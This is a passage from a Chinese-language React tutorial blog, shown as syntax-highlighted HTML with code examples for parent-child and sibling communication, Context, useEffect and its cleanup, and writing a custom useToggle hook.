class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"Son"</span>&gt;</span>{props.children}<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">const</span> name = <span class="string">"John Wick"</span>;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"App"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Son</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello {name}!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>a child of Son<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">Son</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></tbody></table></figure><h3 id="子传父"><a class="markdownIt-Anchor" href="#子传父"></a> 子传父</h3><p>核心思想：利用父组件传递的函数传递自己的参数 / 数据</p><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { useState } <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params">props</span>) {</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"Son"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>I am a Son<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">onChange</span>=<span class="string">{(e)</span> =&gt;</span> props.onSendMsg(e.target.value)} /&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">{()</span> =&gt;</span> props.onSendMsg("Hello from Son")}&gt;</span></span><br><span class="line"><span class="language-xml">        send message</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">const</span> [msg, setMsg] = <span class="title function_">useState</span>(<span class="string">""</span>);</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">sendMsg</span> = (<span class="params">msg</span>) =&gt; {</span><br><span class="line">    <span class="title function_">setMsg</span>(msg);</span><br><span class="line">  };</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"App"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        I am a Parent, and I have a Son who can send me a message: {msg}</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Son</span> <span class="attr">onSendMsg</span>=<span class="string">{sendMsg}</span>&gt;</span><span class="tag">&lt;/<span class="name">Son</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></tbody></table></figure><p>如果传递的函数数量较少，也可以直接解构处理它。</p><h2 id="react-兄弟通信"><a class="markdownIt-Anchor" href="#react-兄弟通信"></a> React 兄弟通信</h2><p>很容易想到一个办法是：借助父组件进行数据传递。</p><h3 id="朴素的办法-状态提升"><a class="markdownIt-Anchor" href="#朴素的办法-状态提升"></a> 朴素的办法 - 状态提升</h3><p>假设有 B、C 组件为兄弟关系，它们存在一个共同的父组件 App，构建如下：</p><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { useState } <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">B</span>(<span class="params">props</span>) {</span><br><span class="line">  <span class="keyword">const</span> bMsg = <span class="string">"Hello from B"</span>;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"B"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h2</span>&gt;</span>This is B component<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>bMsg: {bMsg}<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">{()</span> =&gt;</span> props.AppMsg(bMsg)}&gt;sending bMsg to C<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">{()</span> =&gt;</span> props.AppMsg("")}&gt;clearing AppMsg<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">const</span> [msg, setMsg] = <span class="title function_">useState</span>(<span class="string">""</span>);</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">appClick</span> = (<span class="params">msg</span>) =&gt; {</span><br><span class="line">    <span class="title function_">setMsg</span>(msg);</span><br><span class="line">  };</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"App"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">B</span> <span class="attr">AppMsg</span>=<span class="string">{appClick}</span>&gt;</span><span class="tag">&lt;/<span class="name">B</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">C</span> <span class="attr">AppMsg</span>=<span class="string">{msg}</span>&gt;</span><span class="tag">&lt;/<span class="name">C</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">C</span>(<span class="params">{ AppMsg }</span>) {</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"C"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h2</span>&gt;</span>This is C component<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>{AppMsg}<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></tbody></table></figure><p>注意区分给 B 组件和 C 组件传递的 AppMsg 分别是什么：B 为回调函数，C 为来自 B 组件的消息字符串。</p><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;B <span class="title class_">AppMsg</span>={appClick}&gt;&lt;/B&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">C</span> <span class="attr">AppMsg</span>=<span class="string">{msg}</span>&gt;</span><span class="tag">&lt;/<span class="name">C</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><p>运行结果如下：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411111634311.gif" alt="recording"></p><h3 id="其他方法-待补充"><a class="markdownIt-Anchor" href="#其他方法-待补充"></a> 其他方法 - 待补充</h3><p>TODO</p><h2 id="跨层级通信-context"><a class="markdownIt-Anchor" href="#跨层级通信-context"></a> 跨层级通信 - Context</h2><p>适用于形成顶层 - 底层层级关系的组件通信。</p><p>假设有 App、B、C 三个组件。B 组件是被 App 使用的子组件，且 B 组件中又使用 C 组件，则此时 C 组件为底层组件而 App 为顶层组件。</p><ol><li>使用 createContext 方法创建一个上下文对象 Ctx（名称可随意）</li><li>在顶层组件（App）中通过 <code>Ctx.Provider</code> 组件提供数据</li><li>在底层组件（C）中通过 <code>useContext</code> 钩子函数获取消费数据</li></ol><p>代码示例如下：</p><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { createContext, useContext } <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">MsgContext</span> = <span class="title function_">createContext</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">AppMsg</span> = <span class="string">"Hello from App."</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">AppMsg2</span> = <span class="string">"Hello from App2."</span>;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"App"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">MsgContext.Provider</span> <span class="attr">value</span>=<span class="string">{[AppMsg,</span> <span class="attr">AppMsg2</span>]}&gt;</span></span></span><br><span class="line"><span class="language-xml">        This is App component.</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">B</span>&gt;</span><span class="tag">&lt;/<span class="name">B</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">MsgContext.Provider</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">B</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"B"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>This is B component<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">C</span>&gt;</span><span class="tag">&lt;/<span class="name">C</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">C</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">const</span> bMsg = <span class="title function_">useContext</span>(<span class="title class_">MsgContext</span>);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"C"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>This is C component. <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>{bMsg}<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></tbody></table></figure><p>传递多个数据 <code>&lt;MsgContext.Provider value={[AppMsg, AppMsg2]}&gt;</code>，需要用数组进行传递。</p><div class="note info flat"><p>实际上，任何能够形成顶层 - 底层层级的组件关系都可以使用 Context 进行通信。</p><p>例如，父子关系也是一种顶层 - 底层关系。</p></div><h2 id="useeffect-概念"><a class="markdownIt-Anchor" href="#useeffect-概念"></a> useEffect 概念</h2><p>useEffect 是一个 <code>React Hook</code> 函数，用于在 React 组件中创建不是由事件引起而是<strong>由渲染本身引起的</strong>操作，比如发送 AJAX 请求，更改 DOM 等等。</p><p>一个简单的场景是：当组件加载完毕之后需要获取数据（发送请求），实现数据渲染。</p><p>语法：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> {}, []);</span><br></pre></td></tr></tbody></table></figure><ul><li>参数 1 是一个函数，可以把它叫做副作用函数，在函数内部可以放置要执行的操作。</li><li>参数 2 是一个数组（可选），在数组里放置依赖项，不同依赖项会影响第一个参数函数的执行，<strong>当是一个空数组的时候，副作用函数只会在组件渲染完毕之后执行一次。</strong></li></ul><p>代码可以是：</p><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { useEffect, useState } <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">const</span> requestUrl =</span><br><span class="line">    <span class="string">"https://smart-shop.itheima.net/index.php?s=/api/goods/list&amp;categoryId=10036"</span>;</span><br><span class="line">  <span class="keyword">const</span> [resList, setResList] = <span class="title function_">useState</span>([]);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchData</span>(<span class="params"></span>) {</span><br><span class="line">      <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">fetch</span>(requestUrl);</span><br><span class="line">      <span class="keyword">const</span> { data } = <span class="keyword">await</span> res.<span class="title function_">json</span>();</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">list</span>.<span class="property">data</span>);</span><br><span class="line">      <span class="title function_">setResList</span>(data.<span class="property">list</span>.<span class="property">data</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="title function_">fetchData</span>();</span><br><span class="line">  }, []);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"App"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        {resList.map((item) =&gt; (</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">{item.goods_id}</span>&gt;</span>{item.goods_name}<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        ))}</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></tbody></table></figure><p>依赖项的具体影响如下表：</p><table><thead><tr><th style="text-align:center">依赖项</th><th style="text-align:left">副作用函数执行时机</th></tr></thead><tbody><tr><td style="text-align:center">没有依赖项：不写</td><td style="text-align:left">组件初始渲染 + 组件更新时执行</td></tr><tr><td style="text-align:center">空数组依赖：[ ]</td><td style="text-align:left"> 只在初始渲染时执行一次</td></tr><tr><td style="text-align:center">特定依赖项：[example]</td><td style="text-align:left"> 组件初始渲染 + 特定依赖项变化时执行</td></tr></tbody></table><h2 id="useeffect-清除副作用"><a class="markdownIt-Anchor" href="#useeffect-清除副作用"></a> useEffect - 清除副作用</h2><p>在 useEffect 中编写的由渲染本身引起的对接组件外部的操作，社区也经常把它叫做副作用操作。比如在 useEffect 中开启了一个定时器，我们想在组件卸载时把这个定时器再清理掉，这个过程就是清理副作用。</p><p>语法：</p><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">  ...副作用操作逻辑...</span><br><span class="line">  <span class="keyword">return</span> <span class="function">() =&gt;</span> {</span><br><span class="line">    ...清除副作用逻辑...</span><br><span class="line">  }</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p>也就是在 return 中新写一个函数，该函数<strong>最常见</strong>的执行时机是在<strong>组件卸载时自动执行</strong>。</p><p>例如，在 Son 组件中开启一个定时器，卸载时清除这个定时器。代码可以是：</p><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { useEffect, useState } <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">B</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">    <span class="keyword">let</span> timer = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"工作中..."</span>);</span><br><span class="line">    }, <span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="function">() =&gt;</span> {</span><br><span class="line">      <span class="built_in">clearInterval</span>(timer);</span><br><span class="line">      timer = <span class="literal">null</span>;</span><br><span class="line">    };</span><br><span class="line">  }, []);</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"B"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">const</span> [isShow, setIsShow] = <span class="title function_">useState</span>(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"App"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      {isShow &amp;&amp; <span class="tag">&lt;<span class="name">B</span> /&gt;</span>}</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">{()</span> =&gt;</span> setIsShow(!isShow)}&gt;卸载B<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></tbody></table></figure><h2 id="react-自定义-hook-函数"><a class="markdownIt-Anchor" href="#react-自定义-hook-函数"></a> React 自定义 hook 函数</h2><p>假设要实现一个将某元素结构隐藏 / 显示的按钮逻辑，代码可以是：</p><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { useState } <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">const</span> [isShow, setIsShow] = <span class="title function_">useState</span>(<span class="literal">false</span>);</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">handleClick</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">    <span class="title function_">setIsShow</span>(!isShow);</span><br><span class="line">  };</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"App"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      {isShow &amp;&amp; <span class="tag">&lt;<span class="name">h2</span>&gt;</span>This is John Wick.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>}</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">{setIsShow}</span>&gt;</span>Toggle<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></tbody></table></figure><p>但很显然，这种切换元素结构隐藏或显示的代码是经常使用的，如果每一次都需要手动再写一次较为麻烦，于是这里引出封装自定义 hook 函数。</p><ol><li>声明一个以 use 打头的函数</li><li>在函数体内封装可复用的逻辑（只要是可复用的逻辑）</li><li>把组件中用到的状态或者回调 return 出去（以对象或者数组）</li><li>在哪个组件中要用到这个逻辑，就执行这个函数，解构出来状态和回调进行使用</li></ol><p>所以，代码也可以是下面这种：</p><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { useState } <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">useToggle</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">const</span> [isShow, setIsShow] = <span class="title function_">useState</span>(<span class="literal">false</span>);</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">toggle</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">    <span class="title function_">setIsShow</span>(!isShow);</span><br><span class="line">  };</span><br><span class="line">  <span class="keyword">return</span> [isShow, toggle];</span><br><span class="line">}</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">const</span> [isShow, toggle] = <span class="title function_">useToggle</span>();</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"App"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      {isShow &amp;&amp; <span class="tag">&lt;<span class="name">h2</span>&gt;</span>This is John Wick.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>}</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">{toggle}</span>&gt;</span>Toggle<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></tbody></table></figure><div class="note warning flat"><p>warning</p><ol><li>hook 函数只能在组件中或者其他自定义 hook 函数中调用</li><li> hook 函数只能在组件的顶层调用，不能嵌套在 if、for 或者其他函数中</li></ol></div><p>下面两种调用方式都是错误的：</p><ol><li><p>组件外调用</p><figure class="highlight jsx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 